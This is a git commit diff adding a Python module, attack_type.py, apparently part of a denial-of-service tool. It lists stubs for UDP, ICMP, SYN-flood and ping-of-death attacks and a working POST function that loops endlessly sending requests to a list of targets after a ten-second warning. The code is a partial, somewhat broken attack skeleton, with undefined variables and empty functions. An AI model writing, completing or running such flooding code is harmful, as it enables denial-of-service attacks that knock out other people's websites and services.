c9e41d536315625cf98834fa50177a80016da5cb
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-04 09:34:19 +0200

    Update attack_type.py

--- lib/attack_type.py
+++ lib/attack_type.py
@@ -1,1 +1,27 @@
-#later
+import requests as res
+
+
+
+def udp_flooding(i):
+    print("first choice")
+
+def ICMP(i):
+    pass
+
+def Syn_flood(i):
+    pass
+
+def pof(i):
+    pass
+
+def Post(i):
+    print("using post method to: ", vector)
+    print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
+    time.sleep(10)
+    while True:
+        for target in vector:
+            response = res.post(target, data=bye, json=None)
+            print(response.text)
+
+def Get(i):
+    pass
